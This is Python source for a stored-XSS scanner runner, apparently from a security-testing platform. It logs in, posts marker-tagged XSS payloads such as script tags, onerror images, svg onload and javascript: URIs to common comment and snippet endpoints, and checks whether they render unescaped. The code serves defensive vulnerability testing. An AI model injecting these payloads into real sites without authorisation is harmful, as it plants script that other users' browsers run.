"""stored-xss-probe — POST a payload to a user-content endpoint, then GET
the rendering page and verify the payload reflects verbatim.

A user can SEE that reflected XSS exists in a URL parameter (xss-extended
already catches that) but STORED XSS — payload persisted in the app and
served back to OTHER users — is a separate, more dangerous class. This
runner does that round-trip.

Strategy:
1. Register a fresh user; if the app requires "author"/"editor" status to
   post content, try common author-flag params (Gruyere uses is_author).
2. Try several plausible submission endpoints (snippet, comment, post,
   note, message).
3. POST/GET each payload with a unique marker.
4. Refetch the rendering page (/snippets, /feed, /posts) and check if the
   payload survives unescaped.
5. CRITICAL when the unsanitized payload is reflected on a page another
   user would view.
"""
from __future__ import annotations

import json
import logging
import random
import string
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.auth_discoverer import acquire_session
from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution

logger = logging.getLogger(__name__)

RUNNER_NAME = "stored-xss-probe"
RESULTS_ARTIFACT_NAME = "stored-xss-results.json"
DEFAULT_TIMEOUT = 20.0

# Endpoints commonly used for user content submission.
# Each tuple = (submit_endpoint, parameter_name, render_endpoint).
SUBMIT_RENDER_PAIRS: tuple[tuple[str, str, str], ...] = (
    # Google Gruyere
    ("newsnippet2", "snippet", "snippets.gtl"),
    # Generic patterns
    ("snippet/new", "content", "snippets"),
    ("comment", "body", "comments"),
    ("comments", "text", "comments"),
    ("post", "content", "posts"),
    ("posts", "body", "posts"),
    ("message", "text", "messages"),
    ("note", "content", "notes"),
    ("api/snippets", "content", "snippets"),
    ("api/comments", "content", "comments"),
)

# Each entry: (label, payload_template). `{MARK}` gets a per-attempt unique marker.
# Different payloads exercise different sanitiser bypass patterns.
PAYLOAD_TEMPLATES: tuple[tuple[str, str], ...] = (
    ("script_tag", "<script>x={MARK};</script>"),
    ("onerror_img", "<img src=x onerror='x={MARK}'>"),
    ("onmouseover_anchor", "<a onmouseover=\"x={MARK}\">{MARK}</a>"),
    ("javascript_uri", "<a href=\"javascript:{MARK}\">click</a>"),
    ("svg_onload", "<svg onload='x={MARK}'></svg>"),
    ("malformed_p_script", "<p <script>x={MARK}</script>"),
    ("style_expression", "<span style=\"width:expression(x={MARK})\">{MARK}</span>"),
)


def _artifact(payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=RESULTS_ARTIFACT_NAME,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _random_creds() -> tuple[str, str]:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"sxprobe_{suffix}", f"pw_{suffix}"


def _path_root(target: str) -> str:
    parsed = urlparse(target)
    if not parsed.path or parsed.path == "/":
        return target.rstrip("/") + "/"
    if not parsed.path.endswith("/"):
        return target.rsplit("/", 1)[0] + "/"
    return target


def _acquire_session_for_target(
    base: str, scope_allowlist: dict[str, Any] | None
) -> tuple[httpx_client.Client | None, str | None]:
    """Migration #328: replaces the previous Gruyere-specific
    `_register_as_author` helper with the shared auth_discoverer
    pipeline (fingerprint -> cache -> AI recipe -> verify -> execute).
    Returns (client, username) on success or (None, None) on failure."""
    session = acquire_session(base, scope_allowlist=scope_allowlist)
    if session is None:
        return None, None
    return session.get("client"), session.get("username")


def _is_unescaped(payload: str, body: str) -> bool:
    """Return True if `payload` appears in `body` without HTML-entity encoding.
    We strictly check for verbatim substring match; a sanitised version would
    have replaced `<` with `&lt;` etc.
    """
    return payload in body


def execute_stored_xss_probe(
    targets: list[str] | list[dict[str, Any]],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    timeout_seconds: float = DEFAULT_TIMEOUT,
    stack_hints: list[str] | None = None,
) -> RunnerExecution:
    # #338 — accept stack_hints for forward-compat. SUBMIT_RENDER_PAIRS
    # is a 3-tuple shape (submit_path, param_name, render_path) which
    # doesn't fit the 2-tuple paths_for_stack registry. The hint is
    # logged in trace metadata; future task may expand the registry to
    # carry submit/param/render triples for per-stack stored-xss flows.
    _ = stack_hints  # noqa: F841 — kwarg reserved for stack-aware extension
    findings_payload: list[dict[str, Any]] = []
    trace: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    web_targets: list[str] = []
    for t in targets:
        if isinstance(t, str):
            if t.strip().lower().startswith(("http://", "https://")):
                web_targets.append(t.strip())
        elif isinstance(t, dict):
            kind = str(t.get("kind") or "").lower()
            value = str(t.get("value") or "").strip()
            if kind == "url" and value:
                web_targets.append(value)

    if not web_targets:
        return RunnerExecution(
            tool=RUNNER_NAME, exit_code=2, stdout=json.dumps({"trace": []}),
            stderr="no web targets supplied",
            metadata={"status": "skip"},
            artifacts=[_artifact({"trace": []})], protected_outputs=[],
        )

    for target in web_targets:
        base = _path_root(target)
        trace_entry: dict[str, Any] = {"target": target, "base": base, "attempts": []}

        # Acquire session ONCE per target via the shared auth_discoverer
        # pipeline. Cache makes repeats cheap; verify guarantees the
        # session is alive before submitting payloads.
        client, uid = _acquire_session_for_target(base, scope_allowlist)
        if client is None or uid is None:
            trace_entry["attempts"].append({"result": "auth_unavailable"})
            trace.append(trace_entry)
            continue

        try:
            for submit_path, param_name, render_path in SUBMIT_RENDER_PAIRS:
                submit_url = urljoin(base, submit_path)
                render_url = urljoin(base, render_path)
                if scope_allowlist:
                    if not web_target_value_is_allowed_with_path(scope_allowlist, submit_url):
                        continue
                    if not web_target_value_is_allowed_with_path(scope_allowlist, render_url):
                        continue
                for label, template in PAYLOAD_TEMPLATES:
                    marker = "AEGISXSS_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    payload = template.replace("{MARK}", marker)
                    try:
                        submit_resp = client.get(submit_url, params={param_name: payload}, follow_redirects=False)
                        if submit_resp.status_code == 405:
                            submit_resp = client.post(submit_url, data={param_name: payload}, follow_redirects=False)
                    except httpx_client.RequestError:
                        continue
                    if submit_resp.status_code not in (200, 302, 303):
                        continue
                    try:
                        render_resp = client.get(render_url, follow_redirects=False)
                    except httpx_client.RequestError:
                        continue
                    rendered_body = (render_resp.text or "")[:32_768]
                    reflected = _is_unescaped(payload, rendered_body)
                    marker_present = marker in rendered_body
                    trace_entry["attempts"].append({
                        "submit_url": submit_url,
                        "render_url": render_url,
                        "param": param_name,
                        "payload_label": label,
                        "submit_status": submit_resp.status_code,
                        "render_status": render_resp.status_code,
                        "marker_present": marker_present,
                        "payload_reflected_unsanitized": reflected,
                    })
                    if reflected:
                        findings_payload.append({
                            "title": f"Stored XSS Confirmed — {label} via {param_name}",
                            "severity": "critical",
                            "category": "xss",
                            "target_id": render_url,
                            "evidence": {
                                "submit_endpoint": submit_url,
                                "submit_param": param_name,
                                "render_endpoint": render_url,
                                "payload_label": label,
                                "payload": payload,
                                "marker": marker,
                                "body_excerpt": rendered_body[max(0, rendered_body.find(payload) - 100):rendered_body.find(payload) + len(payload) + 100] if reflected else "",
                            },
                        })
                        stderr_lines.append(
                            f"CRITICAL: stored XSS ({label}) reflected on {render_url}"
                        )
        finally:
            try:
                client.close()
            except Exception:
                pass
        trace.append(trace_entry)

    result = {"trace": trace, "findings": findings_payload, "attempt_count": sum(len(t["attempts"]) for t in trace)}
    if findings_payload:
        stderr_lines.append(f"flagged {len(findings_payload)} stored-XSS finding(s)")
    return RunnerExecution(
        tool=RUNNER_NAME,
        exit_code=0,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={
            "status": "ok",
            "tool_version": f"{RUNNER_NAME}:v1",
            "findings_count": len(findings_payload),
        },
        artifacts=[_artifact(result)],
        protected_outputs=[],
    )
